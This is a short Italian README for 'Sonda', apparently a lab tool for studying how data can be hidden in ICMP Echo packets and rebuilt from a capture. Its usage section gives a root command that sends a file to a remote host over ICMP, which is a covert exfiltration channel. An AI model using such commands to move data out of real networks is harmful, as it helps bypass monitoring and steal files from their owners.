# Sonda - ICMP Exfiltration Tool (WIP)

Tool da laboratorio per studiare come dati arbitrari possano essere trasportati dentro traffico ICMP Echo e ricostruiti da una cattura di rete.

## Installazione

```bash
git clone https://github.com/MarcoSoffia/Sonda.git
cd Sonda
pip install -r requirements.txt
```

Richiede permessi di root per inviare pacchetti ICMP raw.

## Uso

```bash
# Invio
sudo python -m sonda --send --file documento.pdf --remote 192.168.1.10

# Ricezione
sudo python -m sonda --read cattura.pcap
```

Per i dettagli completi vedi `docs/manuale-utente.md`.
